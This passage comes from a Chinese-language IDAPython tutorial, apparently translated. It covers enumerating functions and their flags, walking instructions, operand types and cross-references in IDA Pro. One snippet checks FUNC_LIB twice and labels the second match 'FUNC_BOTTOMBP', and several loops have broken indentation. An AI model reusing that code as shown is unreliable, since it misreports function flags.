class="hljs-string">&#x27;__setattr__&#x27;</span>, <span class="hljs-string">&#x27;__sizeof__&#x27;</span>, <span class="hljs-string">&#x27;__str__&#x27;</span>, <span class="hljs-string">&#x27;__subclasshook__&#x27;</span>,<br><span class="hljs-string">&#x27;__swig_destroy__&#x27;</span>, <span class="hljs-string">&#x27;__weakref__&#x27;</span>, <span class="hljs-string">&#x27;_print&#x27;</span>, <span class="hljs-string">&#x27;analyzed_sp&#x27;</span>,<br><span class="hljs-string">&#x27;argsize&#x27;</span>, <span class="hljs-string">&#x27;clear&#x27;</span>, <span class="hljs-string">&#x27;color&#x27;</span>, <span class="hljs-string">&#x27;compare&#x27;</span>, <span class="hljs-string">&#x27;contains&#x27;</span>, <span class="hljs-string">&#x27;does_return&#x27;</span>,<br><span class="hljs-string">&#x27;empty&#x27;</span>, <span class="hljs-string">&#x27;endEA&#x27;</span>, <span class="hljs-string">&#x27;extend&#x27;</span>, <span class="hljs-string">&#x27;flags&#x27;</span>, <span class="hljs-string">&#x27;fpd&#x27;</span>, <span class="hljs-string">&#x27;frame&#x27;</span>, <span class="hljs-string">&#x27;frregs&#x27;</span>,<br><span class="hljs-string">&#x27;frsize&#x27;</span>, <span class="hljs-string">&#x27;intersect&#x27;</span>, <span class="hljs-string">&#x27;is_far&#x27;</span>, <span class="hljs-string">&#x27;llabelqty&#x27;</span>, <span class="hljs-string">&#x27;llabels&#x27;</span>,<br><span class="hljs-string">&#x27;overlaps&#x27;</span>, <span class="hljs-string">&#x27;owner&#x27;</span>, <span class="hljs-string">&#x27;pntqty&#x27;</span>, <span class="hljs-string">&#x27;points&#x27;</span>, <span class="hljs-string">&#x27;referers&#x27;</span>, <span class="hljs-string">&#x27;refqty&#x27;</span>,<br><span class="hljs-string">&#x27;regargqty&#x27;</span>, <span class="hljs-string">&#x27;regargs&#x27;</span>, <span class="hljs-string">&#x27;regvarqty&#x27;</span>, <span class="hljs-string">&#x27;regvars&#x27;</span>, <span class="hljs-string">&#x27;size&#x27;</span>, <span class="hljs-string">&#x27;startEA&#x27;</span>,<br><span class="hljs-string">&#x27;tailqty&#x27;</span>, <span class="hljs-string">&#x27;tails&#x27;</span>, <span class="hljs-string">&#x27;this&#x27;</span>, <span class="hljs-string">&#x27;thisown&#x27;</span>]<br></code></pre></td></tr></table></figure><p>从这个输出我们能明白<code>startEA</code>和<code>endEA</code>用来访问函数的开始和结束。这些属性只适用于当前函 数。如果我们想要访问其他函数我们可以使用<code>idc.NextFunction(ea)</code>(下一个函数)和<code>idc.PrevFunction(ea)</code>(上一个函数)。<code>ea</code>的值仅需要在分析的函数的边界的地址里。枚举函数的一个警告是，只有当<code>IDA</code>将代码块标识为函数时，它才起作用。在代码块被标记为一个函数之前，它将在函数枚举过程中跳过。未标记为函数的代码将在图例中标记为红色(顶部的颜色栏)。这些可以手动固定或自动。<code>IDAPython</code>有很多不同的方法来访问相同的数据。访问边界内的一种常见的方法是使用 一个函数<code>idc.GetFunctionAttr(ea, FUNCATTR_START)</code>和<code>idc.GetFunctionAttr(ea, FUNCATTR_END)</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">Python&gt; ea = here()<br>Python&gt; start = idc.GetFunctionAttr(ea, FUNCATTR_START)<br>Python&gt; end = idc.GetFunctionAttr(ea, FUNCATTR_END)<br>Python&gt; cur_addr = start<br>Python&gt; <span class="hljs-keyword">while</span> cur_addr &lt;= end:<br><span class="hljs-meta">... </span><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(cur_addr), idc.GetDisasm(cur_addr))<br><span class="hljs-meta">... </span>cur_addr = idc.NextHead(cur_addr, end)<br>Python&gt;<br><span class="hljs-number">0x45c7c3</span> mov eax, [ebp-60h]<br><span class="hljs-number">0x45c7c6</span> push eax ; void *<br><span class="hljs-number">0x45c7c7</span> call w_delete<br><span class="hljs-number">0x45c7cc</span> retn<br></code></pre></td></tr></table></figure><p><code>idc.GetFunctionAttr(ea, attr)</code>是用来获取开始和结束的函数，然后我们打印当前地址和反 汇编通常使用<code>idc.GetDisasm(ea)</code>。我们使用<code>idc.NextHead(eax)</code>来获取下个指令的开始和继续直到我们到达这个函数的末尾。这种方式的一个缺陷是包含在开始和结束的功能边界。如果 有一个跳转地址高于函数的末尾循环也将过早的退出。这些类型的跳转在混淆技术(如代码转换)中非常常见。由于边界是不可靠的最好的实践是调用 <code>idautils.FuncItems(ea)</code>去循环函 数的每个地址。我们将进入更详细的关于这个方法在下面的部分。类似于<code>idc.GetFunctionAttr(ea, attr)</code>另一个有用的函数收集有关于函数的信息是<code>GetFunctionFlags(ea)</code>。它可以用来检索有关函数的信息，如库代码或函数不返回值。一个函数可能有 9 个标志。如果我们想列举所有的功能，我们可以使用以下代码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python">Python&gt; <span class="hljs-keyword">import</span> idautils<br>Python&gt; <span class="hljs-keyword">for</span> func <span class="hljs-keyword">in</span> idautils.Functions():<br><span class="hljs-meta">... </span>flags = idc.GetFunctionFlags(func)<br><span class="hljs-meta">... </span><span class="hljs-keyword">if</span> flags &amp; FUNC_NORET:<br><span class="hljs-meta">... </span><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(func), <span class="hljs-string">&quot;FUNC_NORET&quot;</span>)<br><span class="hljs-meta">... </span><span class="hljs-keyword">if</span> flags &amp; FUNC_FAR:<br><span class="hljs-meta">... </span><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(func), <span class="hljs-string">&quot;FUNC_FAR&quot;</span>)<br><span class="hljs-meta">... </span><span class="hljs-keyword">if</span> flags &amp; FUNC_LIB:<br><span class="hljs-meta">... </span><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(func), <span class="hljs-string">&quot;FUNC_LIB&quot;</span>)<br><span class="hljs-meta">... </span><span class="hljs-keyword">if</span> flags &amp; FUNC_STATIC:<br><span class="hljs-meta">... </span><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(func), <span class="hljs-string">&quot;FUNC_STATIC&quot;</span>)<br><span class="hljs-meta">... </span><span class="hljs-keyword">if</span> flags &amp; FUNC_FRAME:<br><span class="hljs-meta">... </span><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(func), <span class="hljs-string">&quot;FUNC_FRAME&quot;</span>)<br><span class="hljs-meta">... </span><span class="hljs-keyword">if</span> flags &amp; FUNC_USERFAR:<br><span class="hljs-meta">... </span><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(func), <span class="hljs-string">&quot;FUNC_USERFAR&quot;</span>)<br><span class="hljs-meta">... </span><span class="hljs-keyword">if</span> flags &amp; FUNC_HIDDEN:<br><span class="hljs-meta">... </span><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(func), <span class="hljs-string">&quot;FUNC_HIDDEN&quot;</span>)<br><span class="hljs-meta">... </span><span class="hljs-keyword">if</span> flags &amp; FUNC_THUNK:<br><span class="hljs-meta">... </span><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(func), <span class="hljs-string">&quot;FUNC_THUNK&quot;</span>)<br><span class="hljs-meta">... </span><span class="hljs-keyword">if</span> flags &amp; FUNC_LIB:<br><span class="hljs-meta">... </span><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(func), <span class="hljs-string">&quot;FUNC_BOTTOMBP&quot;</span>)<br></code></pre></td></tr></table></figure><p>我们使用<code>idautils.Functions()</code>来获取所有已知函数列表的地址同时我们使用<code>idc.GetFunctionFlags(ea)</code>来获取标志。我们检测值通过使用逻辑<code>&amp;</code>在返回值的时候。例如 检测是否函数没有返回值我们将使用接下来的比较<code>if flags &amp; FUNC_NORET</code>。接下来我们重温所有的标志。这些标志是常见的，其他的是罕见的。</p><h3 id="FUNC-NORET">FUNC_NORET</h3><p>这个标志用来标识一个函数没有执行一个返回指令。它的内部表示等于 1。一个不返回值的函数的例子，如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">CODE:004028F8 sub_4028F8 proc near<br>CODE:004028F8<br>CODE:004028F8 and eax, 7Fh<br>CODE:004028FB mov edx, [esp+0]<br>CODE:004028FE jmp sub_4028AC<br>CODE:004028FE sub_4028F8 endp<br></code></pre></td></tr></table></figure><h3 id="FUNC-FAR">FUNC_FAR</h3><p>这个标志很少出现，除非逆向软件使用分段内存。它的内部表示为一个整数 2</p><h3 id="FUNC-USERFAR">FUNC_USERFAR</h3><p>这个标志比较罕见，具有非常小的文件。<code>hexrays</code>描述标志为“用户已指定远性功能”。它的内部值为 32</p><h3 id="FUNC-LIB">FUNC_LIB</h3><p>此标志用于查找库代码。识别库代码非常有用，因为它是在执行分析时通常可以忽略的代码。它的内部表示为整数 4 。下面是一个例子，它的使用具有识别功能</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python">Python&gt; <span class="hljs-keyword">for</span> func <span class="hljs-keyword">in</span> idautils.Functions():<br><span class="hljs-meta">... </span>flags = idc.GetFunctionFlags(func)<br><span class="hljs-meta">... </span><span class="hljs-keyword">if</span> flags &amp; FUNC_LIB:<br><span class="hljs-meta">... </span><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(func), <span class="hljs-string">&quot;FUNC_LIB&quot;</span>, GetFunctionName(func))<br>Python&gt;<br><span class="hljs-number">0x1a711160</span> FUNC_LIB _strcpy<br><span class="hljs-number">0x1a711170</span> FUNC_LIB _strcat<br><span class="hljs-number">0x1a711260</span> FUNC_LIB _memcmp<br><span class="hljs-number">0x1a711320</span> FUNC_LIB _memcpy<br><span class="hljs-number">0x1a711662</span> FUNC_LIB __onexit<br>...<br><span class="hljs-number">0x1a711915</span> FUNC_LIB _exit<br><span class="hljs-number">0x1a711926</span> FUNC_LIB __exit<br><span class="hljs-number">0x1a711937</span> FUNC_LIB __cexit<br><span class="hljs-number">0x1a711946</span> FUNC_LIB __c_exit<br><span class="hljs-number">0x1a711955</span> FUNC_LIB _puts<br><span class="hljs-number">0x1a7119c0</span> FUNC_LIB _strcmp<br></code></pre></td></tr></table></figure><h3 id="FUNC-STATIC">FUNC_STATIC</h3><p>此标志用于标识作为静态函数编译的函数。在<code>C</code>函数中默认是全局的。如果作者定义了 一个函数为静态只能访问内部文件等功能。在有限的方式下，这可以用来帮助理解源代码是如何构造的</p><h3 id="FUNC-FRAME">FUNC_FRAME</h3><p>这个标志表明该函数使用帧指针<code>EBP</code>。使用帧指针的函数通常以设置堆栈框架的标准函数序言开始</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.text:1A716697 push ebp<br>.text:1A716698 mov ebp, esp<br>.text:1A71669A sub esp, 5Ch<br></code></pre></td></tr></table></figure><h3 id="FUNC-BOTTOMBP">FUNC_BOTTOMBP</h3><p>类似<code>FUNC_FRAME</code>此标记用于跟踪帧指针。它将确定帧指针等于堆栈指针函数</p><h3 id="FUNC-HIDDEN">FUNC_HIDDEN</h3><p>函数带<code>FUNC_HIDDEN</code>标志意味着他们是隐藏的将需要扩展到视图。如果我们转到一个被标记为隐藏的函数的地址，它会自动扩展</p><h3 id="FUNC-THUNK">FUNC_THUNK</h3><p>这标志标识函数是<code>thunk</code>函数。一个简单的功能是跳到另一个函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.text:1A710606 Process32Next proc near<br>.text:1A710606 jmp ds:__imp_Process32Next<br>.text:1A710606 Process32Next endp<br></code></pre></td></tr></table></figure><p>应该指出的是，一个函数可以有多个标志</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">0x1a716697 FUNC_LIB<br>0x1a716697 FUNC_FRAME<br>0x1a716697 FUNC_HIDDEN<br>0x1a716697 FUNC_BOTTOMBP<br></code></pre></td></tr></table></figure><h2 id="指令">指令</h2><p>既然我们知道函数如何访问它们的指令，如果我们有一个函数的地址，我们能使用<code>idautils.FuncItems(ea)</code>获取列表中所有地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 打印该函数段内的所有反汇编</span><br>Python&gt; dism_addr = <span class="hljs-built_in">list</span>(idautils.FuncItems(here()))<br>Python&gt; <span class="hljs-built_in">type</span>(dism_addr)<br>&lt;<span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;list&#x27;</span>&gt;<br>Python&gt; <span class="hljs-built_in">print</span>(dism_addr)<br>[<span class="hljs-number">4573123</span>, <span class="hljs-number">4573126</span>, <span class="hljs-number">4573127</span>, <span class="hljs-number">4573132</span>]<br>Python&gt; <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> dism_addr: <br><span class="hljs-meta">... </span><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(line),idc.GetDisasm(line))<br><span class="hljs-number">0x45c7c3</span> mov eax, [ebp-60h]<br><span class="hljs-number">0x45c7c6</span> push eax ; void *<br><span class="hljs-number">0x45c7c7</span> call w_delete<br><span class="hljs-number">0x45c7cc</span> retn<br></code></pre></td></tr></table></figure><p><code>idautils.FuncItems(ea)</code>实际返回一个迭代器类型但是被强转成一个<code>list</code>。该列表将包含顺序连续的每个指令的起始地址。现在我们已经有了一个很好的知识库来遍历段、函数和指令，让我们展示一个有用的例子。有时当逆向包代码是唯一知道在哪里发生动态调用的。一个动态的调用将调用或跳转到一个操作数是一个寄存器，例如调用<code>eax</code>或<code>jmp edi</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python">Python&gt;<br><span class="hljs-keyword">for</span> func <span class="hljs-keyword">in</span> idautils.Functions(): <span class="hljs-comment"># 获取每一个函数的地址</span><br><span class="hljs-meta">... </span>flags = idc.GetFunctionFlags(func) <span class="hljs-comment"># 获取函数的标志</span><br><span class="hljs-meta">... </span><span class="hljs-keyword">if</span> flags &amp; FUNC_LIB <span class="hljs-keyword">or</span> flags &amp; FUNC_THUNK: <span class="hljs-comment"># 判断是否为库函数或者是thunk函数</span><br>    ... <span class="hljs-keyword">continue</span><br><span class="hljs-meta">... </span>dism_addr = <span class="hljs-built_in">list</span>(idautils.FuncItems(func)) <span class="hljs-comment"># 获取函数的每一个反汇编语句地址</span><br><span class="hljs-meta">... </span><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> dism_addr:<br>    ... m = idc.GetMnem(line) <span class="hljs-comment"># 获取反汇编助记符</span><br><span class="hljs-meta">... </span><span class="hljs-keyword">if</span> m == <span class="hljs-string">&#x27;call&#x27;</span> <span class="hljs-keyword">or</span> m == <span class="hljs-string">&#x27;jmp&#x27;</span>:<br>    ... op = idc.GetOpType(line, <span class="hljs-number">0</span>) <span class="hljs-comment"># 获取第一个操作数</span><br><span class="hljs-meta">... </span><span class="hljs-keyword">if</span> op == o_reg: <span class="hljs-comment"># 如果第一个操作数是寄存器</span><br>    ... <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;0x%x %s&quot;</span> % (line, idc.GetDisasm(line)))<br>Python&gt;<br><span class="hljs-number">0x43ebde</span> call eax ; VirtualProtect<br></code></pre></td></tr></table></figure><p>我们调用<code>idautils.Functions()</code>去获取所有已知函数列表。每个函数我们检索函数的标志通过调用<code>idc.GetFunctionFlags(ea)</code>。如果这个函数是库代码或者<code>thunk</code>函数，则这个函数会被跳过。 接下来我们调用<code>idautils.FuncItems(ea)</code>来获取所有的地址在函数里。我们使用<code>for</code>循环循环遍历列表。由于我们只对<code>call</code>和<code>jmp</code>指令感兴趣我们需要通过调用<code>idc.GetMnem(ea)</code>。然后我 们用一个简单的字符串比较检查法。如果是一个<code>jump</code>或<code>call</code>我们通过操作的类型调用 <code>idc.GetOpType(ea, n)</code>。这个函数将返回一个整数是内部调用<code>op_t.type</code>。这个值可以用来确定 如果操作数是一个寄存器、内存引用等。然后我们检查<code>op_t.type</code>是一个寄存器。如果是这 样，我们打印行强制返回的<code>idautils.FuncItems(ea)</code>到一个列表是有用的，因为迭代器没有对 象如<code>len()</code>。通过把它作为一个列表，我们可以很容易地获得函数中的行数或指令数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">Python&gt; ea = here() <span class="hljs-comment"># 获取当前地址</span><br>Python&gt; <span class="hljs-built_in">len</span>(idautils.FuncItems(ea)) <span class="hljs-comment"># 返回的是迭代器类型，所以没有 len()</span><br>Traceback (most recent call last):<br>File <span class="hljs-string">&quot;&lt;string&gt;&quot;</span>, line <span class="hljs-number">1</span>, <span class="hljs-keyword">in</span> &lt;module&gt;<br>TypeError: <span class="hljs-built_in">object</span> of <span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;generator&#x27;</span> has no <span class="hljs-built_in">len</span>()<br>Python&gt; <span class="hljs-built_in">len</span>(<span class="hljs-built_in">list</span>(idautils.FuncItems(ea)))<br><span class="hljs-number">39</span><br></code></pre></td></tr></table></figure><p>在前一个示例中，我们使用了一个包含函数中所有地址的列表。我们循环每条指令并访问下条指令。如果我们只有一个地址，想获得下一个指示？移动到下一条指令的地址可以使用<code>idc.NextHead(ea)</code>和获得前一条指令地址我们使用<code>idc.PrevHead(ea)</code>。这些功能将得到下一 个指令的开始而不是下一个地址，得到下一个地址我们使用<code>idc.NextAddr(ea)</code>，得到前一个地址我们使用<code>idc.PrevAddr(ea)</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">Python&gt; ea = here()<br>Python&gt; <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(ea), idc.GetDisasm(ea))<br><span class="hljs-number">0x10004f24</span> call sub_10004F32<br>Python&gt; next_instr = idc.NextHead(ea) <span class="hljs-comment"># 获取下一条指令的地址，而不是当前的地址 + 1</span><br>Python&gt; <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(next_instr), idc.GetDisasm(next_instr)) <br><span class="hljs-number">0x10004f29</span> mov [esi], eax<br>Python&gt; prev_instr = idc.PrevHead(ea) <span class="hljs-comment"># 获取上一条指令的地址，而不是当前的地址 - 1</span><br>Python&gt; <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(prev_instr), idc.GetDisasm(prev_instr))<br><span class="hljs-number">0x10004f1e</span> mov [esi+98h], eax<br>Python&gt; <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(idc.NextAddr(ea)))<br><span class="hljs-number">0x10004f25</span><br>Python&gt; <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(idc.PrevAddr(ea)))<br><span class="hljs-number">0x10004f23</span><br></code></pre></td></tr></table></figure><h2 id="操作数">操作数</h2><p>操作数的类型是常用的，它将有助于复习所有的类型。正如前面所述，我们可以使用<code>idc.GetOpType(ea,n)</code>得到的操作数的类型。<code>ea</code>是地址，<code>n</code>是索引。这里有 8 种不同类型的操 作数类型</p><h3 id="o-void">o_void</h3><p>如果一个指令没有任何操作数它将返回 0</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">Python&gt; <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(ea), idc.GetDisasm(ea))<br><span class="hljs-number">0xa09166</span> retn<br>Python&gt; <span class="hljs-built_in">print</span> idc.GetOpType(ea,<span class="hljs-number">0</span>)<br><span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h3 id="o-reg">o_reg</h3><p>如果一个操作数是一个普遍的寄存器将返回此类型。这个值在内部表示为 1</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs py">Python&gt; <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(ea), idc.GetDisasm(ea))<br><span class="hljs-number">0xa09163</span> pop edi<br>Python&gt; <span class="hljs-built_in">print</span>(idc.GetOpType(ea,<span class="hljs-number">0</span>))<br><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h3 id="o-mem">o_mem</h3><p>如果一个操作数是直接内存引用它将返回这个类型。这个值在内部表示为 2。这种类型是有用的在<code>DATA</code>段查找引用</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs py">Python&gt; <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(ea), idc.GetDisasm(ea))<br><span class="hljs-number">0xa05d86</span> cmp ds:dword_A152B8, <span class="hljs-number">0</span><br>Python&gt; <span class="hljs-built_in">print</span>(idc.GetOpType(ea,<span class="hljs-number">0</span>))<br><span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><h3 id="o-phrase">o_phrase</h3><p>这个操作数被返回则这个操作数包含一个基本的寄存器或一个索引寄存器。这个值在内部表示为 3</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">Python&gt; <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(ea), idc.GetDisasm(ea))<br><span class="hljs-number">0x1000b8c2</span> mov [edi+ecx], eax<br>Python&gt; <span class="hljs-built_in">print</span>(idc.GetOpType(ea,<span class="hljs-number">0</span>))<br><span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><h3 id="o-displ">o_displ</h3><p>这个操作数被返回则操作数包含寄存器和一个位移值，这个为位移值是一个整数，例如<code>0x18</code>。这是常见的当一条指令访问值在一个结构中。在内部，它表示为 4 的值</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs py">Python&gt;<span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(ea), idc.GetDisasm(ea))<br><span class="hljs-number">0xa05dc1</span> mov eax, [edi+18h]<br>Python&gt;<span class="hljs-built_in">print</span>(idc.GetOpType(ea,<span class="hljs-number">1</span>))<br><span class="hljs-number">4</span><br></code></pre></td></tr></table></figure><h3 id="o-imm">o_imm</h3><p>操作数是这样一个为整数的<code>0xc</code>的值的类型(立即数)。它在内部表示为 5</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">Python&gt;<span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(ea), idc.GetDisasm(ea))<br><span class="hljs-number">0xa05da1</span> add esp, 0Ch<br>Python&gt;<span class="hljs-built_in">print</span>(idc.GetOpType(ea,<span class="hljs-number">1</span>))<br><span class="hljs-number">5</span><br></code></pre></td></tr></table></figure><h3 id="o-far">o_far</h3><p>这个操作数不是很常见当逆向<code>x86</code>或<code>x86_64</code>时。它是用来寻找操作数的访问立即数远地址的。它在内部表示为 6</p><h3 id="o-near">o_near</h3><p>这个操作数不是很常见当逆向<code>x86</code>或<code>x86_64</code>时。它是用来寻找操作数的访问立即数近地址的。它在内部表示为 7</p><h2 id="交叉引用">交叉引用</h2><p>能够找到交叉引用又名外部参考数据或代码是非常重要的。交叉引用是十分重要的，因为它提供在某些数据被使用或一个函数被调用的位置。例如，如果我们想找到<code>WriteFile</code>被调用的地址。使用交叉引用我们需要做的是确定<code>WriteFile</code>的地址在导入表中然后可以找到所有的交叉引用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">Python&gt; wf_addr = idc.LocByName(<span class="hljs-string">&quot;WriteFile&quot;</span>) <span class="hljs-comment"># 通过函数名定位对应API地址</span><br>Python&gt; <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(wf_addr), idc.GetDisasm(wf_addr))<br><span class="hljs-number">0x1000e1b8</span> extrn WriteFile:dword<br>Python&gt; <span class="hljs-keyword">for</span> addr <span class="hljs-keyword">in</span> idautils.CodeRefsTo(wf_addr, <span class="hljs-number">0</span>): <span class="hljs-comment"># API交叉引用</span><br><span class="hljs-meta">... </span><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(addr), idc.GetDisasm(addr))<br><span class="hljs-number">0x10004932</span> call ds:WriteFile<br><span class="hljs-number">0x10005c38</span> call ds:WriteFile<br><span class="hljs-number">0x10007458</span> call ds:WriteFile<br></code></pre></td></tr></table></figure><p>第一行我们得到了API <code>WriteFile</code>的地址通过使用<code>idc.LocByName(str)</code>。这个函数将返回一个<code>API</code>的地址。我们输出<code>WriteFile</code>的地址是一个字符串表示的。然后遍历所有的交叉引用通过调用<code>idautils.CodeRefsTo(ea, flow)</code>。它能通过遍历将返回一个迭代器。<code>ea</code>是我们想要得到的交叉引用的地址。参数流是一个<code>bool</code>类型。它被用来指定是否要遵照正常的代码流。然后显示每一个交叉引用的地址。一个快速的注释关于使用<code>idc.LocByName(str)</code>。所有的重命名函数和<code>APIs</code>在一个<code>IDB</code>中能被访问通过调用<code>idautils.Names()</code>。这个函数返回一个迭代器对 象能够循环遍历输出或者访问名称。每个名称的项是一个<code>(ea, str_name)</code>的元组</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs py">Python&gt; [x <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> Names()]<br>[(<span class="hljs-number">268439552</span>, <span class="hljs-string">&#x27;SetEventCreateThread&#x27;</span>), (<span class="hljs-number">268439615</span>, <span class="hljs-string">&#x27;StartAddress&#x27;</span>),<br>(<span class="hljs-number">268441102</span>, <span class="hljs-string">&#x27;SetSleepClose&#x27;</span>),....<br></code></pre></td></tr></table></figure><p>如果我们想要获得代码在哪里被引用，我们需要使用<code>idautisl.CodeRefsFrom(ea,flow)</code>。例如让我们获取在<code>0x10004932</code>被引用的地址</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs py">Python&gt; ea = <span class="hljs-number">0x10004932</span><br>Python&gt; <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(ea), idc.GetDisasm(ea))<br><span class="hljs-number">0x10004932</span> call ds:WriteFile<br>Python&gt; <span class="hljs-keyword">for</span> addr <span class="hljs-keyword">in</span> idautils.CodeRefsFrom(ea, <span class="hljs-number">0</span>): <span class="hljs-comment"># API交叉引用</span><br><span class="hljs-meta">... </span><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(addr), idc.GetDisasm(addr))<br>Python&gt;<br><span class="hljs-number">0x1000e1b8</span> extrn 